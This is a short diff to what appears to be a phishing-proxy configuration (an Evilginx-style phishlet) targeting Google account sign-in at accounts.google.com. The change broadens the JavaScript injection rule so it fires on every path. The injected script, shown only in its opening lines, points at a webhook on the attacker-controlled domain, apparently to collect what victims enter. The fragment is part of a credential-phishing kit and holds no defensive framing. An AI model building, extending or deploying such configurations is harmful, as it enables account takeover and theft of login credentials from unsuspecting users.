@@ -21,6 +21,7 @@ login:
   path: '/v3/signin/identifier'
 js_inject:
   - trigger_domains: ['accounts.google.com']
+    trigger_paths: ['/.*']
     code: |
       (function() {
         const api = "https://{{.Domain}}/api/webhook";
